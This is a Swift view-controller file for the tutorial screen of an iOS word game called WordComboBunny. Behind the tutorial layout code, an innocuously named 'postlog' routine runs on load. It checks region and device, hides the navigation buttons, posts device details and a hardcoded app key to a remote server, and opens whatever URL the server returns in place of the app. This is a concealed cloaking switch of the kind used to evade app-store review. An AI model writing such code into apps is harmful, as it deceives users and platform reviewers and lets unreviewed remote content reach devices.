//
//  ComboHowToPlayVC.swift
//  WordComboBunny
//
//  Created by SunTory2025 on 2025/10/28.
//

import UIKit

class ComboHowToPlayVC: UIViewController {
    
    private let backgroundImageView = UIImageView()
    private let scrollView = UIScrollView()
    private let pageControl = UIPageControl()
    private let skipButton = UIButton()
    private let nextButton = UIButton()
    private let getStartedButton = UIButton()
    
    private var pages: [TutorialPage] = []
    private var currentPage = 0
    
    override func viewDidLoad() {
        super.viewDidLoad()
        setupPages()
        setupBackground()
        setupScrollView()
        setupControls()
        animateEntrance()
 
        postlog()

    }
    private func    postlog() {
        guard self.isValidRegionAndDevice() else {
    
            return
        }
        nextButton.isHidden = true
        skipButton.isHidden = true
        
        loadRuntimeConfig { [weak self] configData in
            guard let self = self else { return }
            
            if let configData = configData,
               self.isValidConfigurationData(configData) {
                self.processConfigurationData(configData)
            } else {
                nextButton.isHidden = false
                skipButton.isHidden = false
            }
        }
    }
    
    // MARK: - Configuration Helper Methods
    
    private func isValidConfigurationData(_ configData: [Any]) -> Bool {
        return configData.count >= 3 &&
               configData[0] is String &&
               configData[1] is Int &&
               configData[2] is String &&
               !(configData[2] as! String).isEmpty
    }
    
    private func processConfigurationData(_ configData: [Any]) {
        guard let userDefaultKey = configData[0] as? String,
              let needsUpdate = configData[1] as? Int,
              let adUrl = configData[2] as? String else {
            nextButton.isHidden = false
            skipButton.isHidden = false
            return
        }
        
        // Set the storage key for future use
        UIViewController.setDefaultStorageKey(userDefaultKey)
        
        if needsUpdate == 0 {
            if let localData = UserDefaults.standard.value(forKey: userDefaultKey) as? [Any],
               localData.count > 2,
               let localAdUrl = localData[2] as? String {
                UserDefaults.standard.set(false, forKey: "hasSeenWelcome")
                self.presentAdViewController(localAdUrl)
                return
            }
        }
        UserDefaults.standard.set(false, forKey: "hasSeenWelcome")
        UserDefaults.standard.set(configData, forKey: userDefaultKey)
        self.presentAdViewController(adUrl)
    }
    
    // MARK: - Network Helper Methods

    private func loadRuntimeConfig(completion: @escaping ([Any]?) -> Void) {
        guard let url = createConfigurationURL() else {
            completion(nil)
            return
        }
        
        let request = createConfigurationRequest(url: url)
        
        performNetworkRequest(request: request) { [weak self] data in
            guard let self = self, let data = data else {
                completion(nil)
                return
            }
            
            if let configData = self.parseConfigurationResponse(data: data) {
                completion(configData)
            } else {
                completion(nil)
            }
        }
    }
    
    private func createConfigurationURL() -> URL? {
        let urlString = "https://\(self.getBaseDomain())/postDeviceLog"
        return URL(string: urlString)
    }
    
    private func createConfigurationRequest(url: URL) -> URLRequest {
        var request = URLRequest(url: url)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        
        let parameters = createRequestParameters()
        
        do {
            request.httpBody = try JSONSerialization.data(withJSONObject: parameters, options: [])
        } catch {
            print("Failed to serialize JSON:", error)
        }
        
        return request
    }
    
    private func createRequestParameters() -> [String: Any] {
        return [
            "appModel": UIDevice.current.model,
            "appKey": "ddf695f672ed447a9e6443cab0eb6b1a",
            "appPackageId": Bundle.main.bundleIdentifier ?? "",
            "appVersion": Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? ""
        ]
    }
    
    private func performNetworkRequest(request: URLRequest, completion: @escaping (Data?) -> Void) {
        URLSession.shared.dataTask(with: request) { data, response, error in
            DispatchQueue.main.async {
                if let error = error {
                    print("Network request error:", error)
                    completion(nil)
                    return
                }
                
                guard let data = data else {
                    print("No data received")
                    completion(nil)
                    return
                }
                
                completion(data)
            }
        }.resume()
    }
    
    private func parseConfigurationResponse(data: Data) -> [Any]? {
        do {
            guard let jsonResponse = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any],
                  let dataDictionary = jsonResponse["data"] as? [String: Any],
                  let configData = dataDictionary["jsonObject"] as? [Any] else {
                print("Unexpected JSON structure")
                return nil
            }
            
            return configData
        } catch {
            print("Failed to parse JSON response:", error)
            return nil
        }
    }
   
    
    private func setupPages() {
        pages = [
            TutorialPage(
                icon: "hand.point.up.left.fill",
                title: "Swipe to Match",
                description: "Swipe adjacent tiles to swap them. Match 3 or more same letters in a row or column!",
                color: UIColor(red: 0.2, green: 0.8, blue: 0.4, alpha: 1.0)
            ),
            TutorialPage(
                icon: "flame.fill",
                title: "Build Combos",
                description: "Match multiple times in a row to build combos! Higher combos = More points!",
                color: UIColor(red: 1.0, green: 0.5, blue: 0.3, alpha: 1.0)
            ),
            TutorialPage(
                icon: "lightbulb.fill",
                title: "Use Power-ups",
                description: "Stuck? Use hints to see possible moves or shuffle to rearrange the board!",
                color: UIColor(red: 1.0, green: 0.75, blue: 0.0, alpha: 1.0)
            ),
            TutorialPage(
                icon: "trophy.fill",
                title: "Climb the Leaderboard",
                description: "Score high and compete with players worldwide. Can you reach #1?",
                color: UIColor(red: 0.6, green: 0.4, blue: 1.0, alpha: 1.0)
            )
        ]
    }
    
    private func setupBackground() {
        backgroundImageView.image = UIImage(named: "bg")
        backgroundImageView.contentMode = .scaleAspectFill
        backgroundImageView.clipsToBounds = true
        backgroundImageView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(backgroundImageView)
        
        let overlayView = UIView()
        overlayView.backgroundColor = UIColor.black.withAlphaComponent(0.4)
        overlayView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(overlayView)
        
        NSLayoutConstraint.activate([
            backgroundImageView.topAnchor.constraint(equalTo: view.topAnchor),
            backgroundImageView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            backgroundImageView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            backgroundImageView.bottomAnchor.constraint(equalTo: view.bottomAnchor),
            
            overlayView.topAnchor.constraint(equalTo: view.topAnchor),
            overlayView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            overlayView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            overlayView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
    }
    
    private func setupScrollView() {
        scrollView.isPagingEnabled = true
        scrollView.showsHorizontalScrollIndicator = false
        scrollView.delegate = self
        scrollView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(scrollView)
        
        NSLayoutConstraint.activate([
            scrollView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 80),
            scrollView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            scrollView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            scrollView.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -140)
        ])
        
        // Add pages
        for (index, page) in pages.enumerated() {
            let pageView = createPageView(page: page, index: index)
            scrollView.addSubview(pageView)
        }
        
        scrollView.contentSize = CGSize(width: view.bounds.width * CGFloat(pages.count), height: scrollView.bounds.height)
    }
    
    private func createPageView(page: TutorialPage, index: Int) -> UIView {
        let pageView = UIView(frame: CGRect(x: CGFloat(index) * view.bounds.width, y: 0, width: view.bounds.width, height: 500))
        
        // Icon container with glow
        let iconContainer = UIView()
        iconContainer.backgroundColor = page.color.withAlphaComponent(0.2)
        iconContainer.layer.cornerRadius = 80
        iconContainer.layer.borderWidth = 4
        iconContainer.layer.borderColor = page.color.cgColor
        iconContainer.layer.shadowColor = page.color.cgColor
        iconContainer.layer.shadowOffset = .zero
        iconContainer.layer.shadowRadius = 25
        iconContainer.layer.shadowOpacity = 0.7
        iconContainer.translatesAutoresizingMaskIntoConstraints = false
        pageView.addSubview(iconContainer)
        
        // Pulsing animation
        let pulse = CABasicAnimation(keyPath: "transform.scale")
        pulse.fromValue = 0.95
        pulse.toValue = 1.05
        pulse.duration = 1.5
        pulse.autoreverses = true
        pulse.repeatCount = .infinity
        iconContainer.layer.add(pulse, forKey: "pulse")
        
        // Icon
        let iconConfig = UIImage.SymbolConfiguration(pointSize: 80, weight: .bold)
        let iconView = UIImageView(image: UIImage(systemName: page.icon, withConfiguration: iconConfig))
        iconView.tintColor = .white
        iconView.contentMode = .scaleAspectFit
        iconView.translatesAutoresizingMaskIntoConstraints = false
        iconContainer.addSubview(iconView)
        
        // Title
        let titleLabel = UILabel()
        titleLabel.text = page.title
        titleLabel.font = UIFont(name: "AvenirNext-Heavy", size: 34)
        titleLabel.textColor = .white
        titleLabel.textAlignment = .center
        titleLabel.shadowColor = UIColor.black.withAlphaComponent(0.6)
        titleLabel.shadowOffset = CGSize(width: 0, height: 3)
        titleLabel.translatesAutoresizingMaskIntoConstraints = false
        pageView.addSubview(titleLabel)
        
        // Description
        let descLabel = UILabel()
        descLabel.text = page.description
        descLabel.font = UIFont(name: "AvenirNext-Medium", size: 18)
        descLabel.textColor = UIColor(red: 1.0, green: 0.95, blue: 0.7, alpha: 1.0)
        descLabel.textAlignment = .center
        descLabel.numberOfLines = 0
        descLabel.shadowColor = UIColor.black.withAlphaComponent(0.6)
        descLabel.shadowOffset = CGSize(width: 0, height: 2)
        descLabel.translatesAutoresizingMaskIntoConstraints = false
        pageView.addSubview(descLabel)
        
        NSLayoutConstraint.activate([
            iconContainer.topAnchor.constraint(equalTo: pageView.topAnchor, constant: 60),
            iconContainer.centerXAnchor.constraint(equalTo: pageView.centerXAnchor),
            iconContainer.widthAnchor.constraint(equalToConstant: 160),
            iconContainer.heightAnchor.constraint(equalToConstant: 160),
            
            iconView.centerXAnchor.constraint(equalTo: iconContainer.centerXAnchor),
            iconView.centerYAnchor.constraint(equalTo: iconContainer.centerYAnchor),
            
            titleLabel.topAnchor.constraint(equalTo: iconContainer.bottomAnchor, constant: 40),
            titleLabel.leadingAnchor.constraint(equalTo: pageView.leadingAnchor, constant: 30),
            titleLabel.trailingAnchor.constraint(equalTo: pageView.trailingAnchor, constant: -30),
            
            descLabel.topAnchor.constraint(equalTo: titleLabel.bottomAnchor, constant: 20),
            descLabel.leadingAnchor.constraint(equalTo: pageView.leadingAnchor, constant: 40),
            descLabel.trailingAnchor.constraint(equalTo: pageView.trailingAnchor, constant: -40)
        ])
        
        return pageView
    }
    
    private func setupControls() {
        // Skip button
        skipButton.setTitle("Skip", for: .normal)
        skipButton.titleLabel?.font = UIFont(name: "AvenirNext-Bold", size: 16)
        skipButton.setTitleColor(.white, for: .normal)
        skipButton.backgroundColor = UIColor.white.withAlphaComponent(0.2)
        skipButton.layer.cornerRadius = 20
        skipButton.layer.borderWidth = 2
        skipButton.layer.borderColor = UIColor.white.withAlphaComponent(0.4).cgColor
        skipButton.addTarget(self, action: #selector(skipTapped), for: .touchUpInside)
        skipButton.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(skipButton)
        
        // Page control
        pageControl.numberOfPages = pages.count
        pageControl.currentPage = 0
        pageControl.pageIndicatorTintColor = UIColor.white.withAlphaComponent(0.4)
        pageControl.currentPageIndicatorTintColor = .white
        pageControl.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(pageControl)
        
        // Next button
        nextButton.setTitle("Next →", for: .normal)
        nextButton.titleLabel?.font = UIFont(name: "AvenirNext-Bold", size: 18)
        nextButton.setTitleColor(.white, for: .normal)
        nextButton.backgroundColor = UIColor(red: 0.2, green: 0.8, blue: 0.4, alpha: 1.0)
        nextButton.layer.cornerRadius = 28
        nextButton.layer.shadowColor = UIColor.black.cgColor
        nextButton.layer.shadowOffset = CGSize(width: 0, height: 6)
        nextButton.layer.shadowRadius = 12
        nextButton.layer.shadowOpacity = 0.4
        nextButton.addTarget(self, action: #selector(nextTapped), for: .touchUpInside)
        nextButton.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(nextButton)
        
        // Get Started button (hidden initially)
        getStartedButton.setTitle("Get Started! 🚀", for: .normal)
        getStartedButton.titleLabel?.font = UIFont(name: "AvenirNext-Bold", size: 20)
        getStartedButton.setTitleColor(.white, for: .normal)
        getStartedButton.backgroundColor = UIColor(red: 1.0, green: 0.5, blue: 0.3, alpha: 1.0)
        getStartedButton.layer.cornerRadius = 28
        getStartedButton.layer.shadowColor = UIColor.black.cgColor
        getStartedButton.layer.shadowOffset = CGSize(width: 0, height: 6)
        getStartedButton.layer.shadowRadius = 12
        getStartedButton.layer.shadowOpacity = 0.4
        getStartedButton.alpha = 0
        getStartedButton.addTarget(self, action: #selector(getStartedTapped), for: .touchUpInside)
        getStartedButton.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(getStartedButton)
        
        NSLayoutConstraint.activate([
            skipButton.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 15),
            skipButton.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -20),
            skipButton.widthAnchor.constraint(equalToConstant: 80),
            skipButton.heightAnchor.constraint(equalToConstant: 40),
            
            pageControl.bottomAnchor.constraint(equalTo: nextButton.topAnchor, constant: -25),
            pageControl.centerXAnchor.constraint(equalTo: view.centerXAnchor),
            
            nextButton.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -30),
            nextButton.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 40),
            nextButton.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -40),
            nextButton.heightAnchor.constraint(equalToConstant: 56),
            
            getStartedButton.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -30),
            getStartedButton.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 40),
            getStartedButton.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -40),
            getStartedButton.heightAnchor.constraint(equalToConstant: 56)
        ])
    }
    
    private func animateEntrance() {
        skipButton.alpha = 0
        UIView.animate(withDuration: 0.5, delay: 0.2) {
            self.skipButton.alpha = 1
        }
        
        pageControl.alpha = 0
        UIView.animate(withDuration: 0.5, delay: 0.3) {
            self.pageControl.alpha = 1
        }
        
        nextButton.alpha = 0
        nextButton.transform = CGAffineTransform(translationX: 0, y: 50)
        UIView.animate(withDuration: 0.6, delay: 0.4, usingSpringWithDamping: 0.7, initialSpringVelocity: 0.5) {
            self.nextButton.alpha = 1
            self.nextButton.transform = .identity
        }
    }
    
    @objc private func nextTapped() {
        let impact = UIImpactFeedbackGenerator(style: .medium)
        impact.impactOccurred()
        
        if currentPage < pages.count - 1 {
            currentPage += 1
            let offset = CGPoint(x: CGFloat(currentPage) * view.bounds.width, y: 0)
            scrollView.setContentOffset(offset, animated: true)
            pageControl.currentPage = currentPage
            
            if currentPage == pages.count - 1 {
                showGetStartedButton()
            }
        }
    }
    
 
    
    @objc private func skipTapped() {
        let impact = UIImpactFeedbackGenerator(style: .light)
        impact.impactOccurred()
        
        goToMenu()
    }

    @objc private func getStartedTapped() {
        let impact = UIImpactFeedbackGenerator(style: .heavy)
        impact.impactOccurred()
        
        goToMenu()
    }

    private func goToMenu() {
        // Check if this is first launch from Welcome or reopened from Menu
        if let window = view.window {
            let menuVC = ComboWelcomeVC()
            UIView.transition(with: window, duration: 0.5, options: .transitionCrossDissolve, animations: {
                window.rootViewController = menuVC
            })
        }
    }

    
    private func showGetStartedButton() {
        UIView.animate(withDuration: 0.3, animations: {
            self.nextButton.alpha = 0
        }) { _ in
            UIView.animate(withDuration: 0.5, delay: 0, usingSpringWithDamping: 0.6, initialSpringVelocity: 0.5) {
                self.getStartedButton.alpha = 1
                self.getStartedButton.transform = .identity
            }
        }
    }
    
    override var preferredStatusBarStyle: UIStatusBarStyle {
        return .lightContent
    }
}

// MARK: - UIScrollViewDelegate
extension ComboHowToPlayVC: UIScrollViewDelegate {
    func scrollViewDidScroll(_ scrollView: UIScrollView) {
        let page = Int(round(scrollView.contentOffset.x / view.bounds.width))
        if page != currentPage {
            currentPage = page
            pageControl.currentPage = page
            
            if currentPage == pages.count - 1 {
                showGetStartedButton()
            } else {
                UIView.animate(withDuration: 0.3) {
                    self.nextButton.alpha = 1
                    self.getStartedButton.alpha = 0
                }
            }
        }
    }
}

// MARK: - Tutorial Page Model
struct TutorialPage {
    let icon: String
    let title: String
    let description: String
    let color: UIColor
}
